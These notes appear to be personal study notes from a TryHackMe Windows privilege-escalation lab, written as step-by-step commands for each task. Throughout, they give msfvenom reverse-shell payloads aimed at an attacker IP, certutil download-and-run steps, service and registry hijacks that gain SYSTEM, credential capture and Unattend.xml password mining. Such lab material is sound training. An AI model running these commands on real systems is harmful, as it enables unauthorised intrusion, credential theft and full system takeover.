# TryHackMe – Windows PrivEsc Arena: Technique Notes (with machine labels)

General workflow: get a low-priv foothold on target (via RDP) → enumerate with `accesschk64.exe`, Autoruns, `whoami /priv`, `net user` → identify the misconfiguration → escalate to SYSTEM/Admin.

Legend: 🐧 = run on Kali (attacker) | 🪟 = run on Windows target (inside RDP session)

---

## Task 3 – Registry Escalation: Autorun
🪟 Use Autoruns / `accesschk64.exe` to find autorun registry entries pointing to a file path your user can write to.

🐧 Generate payload:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
```

🐧 Host it:
```
python3 -m http.server 8000
```

🐧 Start listener:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Pull payload to target:
```
certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
```

🪟 Replace the autorun binary with your payload if write access allows it.
- Note: in this room, the autorun folder actually requires admin rights to write to despite `accesschk` showing everyone with read/write.

---

## Task 4 – Registry Escalation: AlwaysInstallElevated
🪟 Check both registry keys are set to `1`:
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

🐧 Build malicious MSI:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi -o setup.msi
```

🐧 Host it:
```
python3 -m http.server 8000
```

🐧 Start listener:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Download and run on target — installs as SYSTEM:
```
certutil.exe -urlcache -f http://<attacker_ip>:8000/setup.msi setup.msi
msiexec /quiet /qn /i setup.msi
```

---

## Task 5 – Service Escalation: Registry
🪟 Find a service whose registry key is writable by your user:
```
accesschk64.exe -kvuqsw hklm\system\currentcontrolset\services
```

🐧 Generate payload:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
```

🐧 Host it:
```
python3 -m http.server 8000
```

🐧 Start listener:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Pull payload to target:
```
certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
```

🪟 Point ImagePath at your payload and start the service:
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\shell.exe /f
net start regsvc
```

---

## Task 6 – Service Escalation: Executable Files
🪟 Find a service binary (the actual .exe, not the registry key) that your user can overwrite (check with `accesschk64.exe -uwdq <path>`).

🐧 Generate payload:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
```

🐧 Host it:
```
python3 -m http.server 8000
```

🐧 Start listener:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Pull payload, stop service, overwrite binary, restart:
```
certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
net stop <svc>
copy /y shell.exe "C:\path\to\service.exe"
net start <svc>
```

---

## Task 7 – Privilege Escalation: Startup Applications
🪟 Check ACLs on the global Startup folder:
```
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

🐧 Generate payload:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
```

🐧 Host it:
```
python3 -m http.server 8000
```

🐧 Start listener:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Pull payload and drop it in the Startup folder:
```
certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shell.exe"
```

🪟 Log off and back on (or wait for an admin/other user to log in via RDP) to trigger execution.

---

## Task 8 – Service Escalation: DLL Hijacking
🪟 Use Process Monitor (filter: `Result is NAME NOT FOUND`, `Path ends with .dll`) to find a DLL the service tries to load from a path you can write to.

🐧 Build malicious DLL:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f dll -o hijackme.dll
```

🐧 Host it:
```
python3 -m http.server 8000
```

🐧 Start listener:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Pull DLL into the missing-DLL path:
```
certutil.exe -urlcache -f http://<attacker_ip>:8000/hijackme.dll hijackme.dll
```

🪟 Restart the vulnerable service to load it:
```
net stop dllsvc & net start dllsvc
```

---

## Task 9 – Service Escalation: binPath
🪟 Find a service you can directly reconfigure (weak service permissions, not just registry):
```
accesschk64.exe -uwcqv <user> *
```

🐧 Generate payload:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
```

🐧 Host it:
```
python3 -m http.server 8000
```

🐧 Start listener:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Pull payload, reconfigure service binPath, start it:
```
certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
sc config daclsvc binpath= "C:\temp\shell.exe"
net start daclsvc
```

---

## Task 10 – Service Escalation: Unquoted Service Paths
🪟 Find an unquoted service path with spaces:
```
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
e.g.:
`C:\Program Files\Unquoted Path Service\common files\service.exe`

🐧 Generate payload:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o common.exe
```

🐧 Host it:
```
python3 -m http.server 8000
```

🐧 Start listener:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Pull payload into an earlier path segment (e.g. `C:\Program Files\Unquoted Path Service\common.exe`) and start service:
```
certutil.exe -urlcache -f http://<attacker_ip>:8000/common.exe common.exe
sc start unquotedsvc
```

---

## Task 11 – Potato Escalation: Hot Potato
🪟 Run the exploit tool from an elevated-ish PowerShell (bypassing execution policy):
```
powershell -ep bypass
```
Then execute the Hot Potato / Tater exploit binary (transferred from Kali the same way as above via `certutil.exe`), which relays NTLM auth to escalate to SYSTEM.

🐧 (Optional) Set up a listener if the exploit is configured to spawn a reverse shell as part of its payload:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Verify escalation:
```
net localgroup administrators
```

---

## Task 12 – Password Mining: Configuration Files
🪟 Check Unattend.xml for leftover creds:
```
type C:\Windows\Panther\Unattend.xml
```

🐧 or 🪟 Decode the Base64 password (either machine works, shown as Kali here):
```
echo <base64string> | base64 -d
```
Answer: `password123`

---

## Task 13 – Password Mining: Memory
🐧 Start an HTTP Basic Auth capture listener:
```
use auxiliary/server/capture/http_basic
set SRVPORT 80
run
```

🪟 Trigger a target application (e.g. Internet Explorer) to authenticate to that listener over HTTP, or dump a running process's memory via Task Manager → right-click process → "Create dump file".

🐧 or 🪟 Search the resulting dump/capture for cleartext credentials (e.g. using `strings` on Kali if you exfil the dump).

---

## Task 14 – Privilege Escalation: Kernel Exploits
🐧 Generate payload and start listener as usual:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
python3 -m http.server 8000
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

🪟 Pull and execute payload to get initial Meterpreter session:
```
certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
shell.exe
```

🐧 From the Meterpreter session (background it first with `bg`), run the local exploit suggester:
```
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

🐧 Select and run a matching kernel exploit module (e.g. `MS16-014`) against the session to escalate to SYSTEM.

---
*Notes condensed from a public TryHackMe walkthrough for personal reference/study.*
